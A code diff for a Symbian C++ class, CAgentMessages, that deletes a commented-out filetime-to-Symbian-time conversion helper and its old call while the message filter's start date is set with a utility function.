@@ -118,8 +118,8 @@ void CAgentMessages::FillFilter(CMessageFilter* aFilter, const TAgentClassFilter
 		since = aFilterHeader.fromHigh;
 		since <<= 32;
 		since += aFilterHeader.fromLow;
-		//TTime sinceTTime = SetSymbianTime(since);
 		TTime sinceTTime = TimeUtils::GetSymbianTime(since);
+				
 		aFilter->SetStartDate(sinceTTime);
 	}
 	else {
@@ -1346,22 +1346,6 @@ HBufC8* CAgentMessages::GetMarkupBufferL(const TMarkup aMarkup)
  * Please also note that in defining KInitialTime the month and day values are offset from zero.
  * 
  */
-/*
-TInt64 CAgentMessages::SetSymbianTime(TUint64 aFiletime){
-
-	_LIT(KFiletimeInitialTime,"16010000:000000");
-
-	TTime initialFiletime;
-	initialFiletime.Set(KFiletimeInitialTime);
-
-	TInt64 interval;
-	interval = initialFiletime.Int64();
-
-	TInt64 date = aFiletime/10;
-
-	return (interval + date);
-}
-*/
 // TODO: delete this method when finished mail test
 /*
 void CAgentMessages::WriteMailFile(const TDesC8& aData)
